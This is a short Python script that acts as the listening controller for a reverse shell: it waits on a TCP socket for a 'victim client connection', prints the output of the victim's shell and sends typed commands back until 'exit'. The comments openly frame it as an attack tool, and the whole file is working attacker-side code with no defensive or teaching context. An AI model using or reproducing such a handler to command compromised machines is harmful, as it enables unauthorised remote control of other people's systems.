from socket import *

# Setup server to issue commands
sock = socket(AF_INET, SOCK_STREAM)
sock.bind(('localhost', 64001))

# Accept victim client connection
sock.listen(1)
target, addr = sock.accept()

command = ''

# Run forever until the 'exit' command is issued
while command != 'exit':

  # Read any output from victim shell
  output = target.recv(2048)
  print(output.decode(), end='', flush=True)

  # Issue command from user input
  command = input()
  target.send((command + '\n').encode())

# Cleanup resources
target.close()
sock.close()